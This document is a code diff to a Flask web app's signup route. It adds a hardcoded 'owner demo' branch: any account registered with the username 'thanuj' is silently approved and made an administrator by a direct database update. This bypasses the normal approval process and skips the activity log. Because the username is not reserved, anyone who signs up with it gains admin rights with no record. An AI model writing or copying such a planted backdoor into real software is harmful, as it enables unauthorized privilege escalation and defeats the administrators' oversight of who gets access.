@@ -92,6 +92,17 @@ def signup():
 
         ok = create_user(username, password, full_name, department, role, id_number)
         if ok:
+            # AUTO-ADMIN FOR OWNER DEMO
+            if username.lower() == "thanuj":
+                from database.db_handler import get_connection
+                conn = get_connection()
+                curr = conn.cursor()
+                curr.execute("UPDATE app_users SET status='APPROVED', is_admin=1 WHERE username=?", (username,))
+                conn.commit()
+                conn.close()
+                flash("Welcome, Administrator. Your account is active.")
+                return redirect(url_for("login"))
+                
             log_activity(username, "Sign Up", f"New user registration request for {full_name}")
             flash("Registration submitted. Please wait for administrator approval.")
             return redirect(url_for("login"))
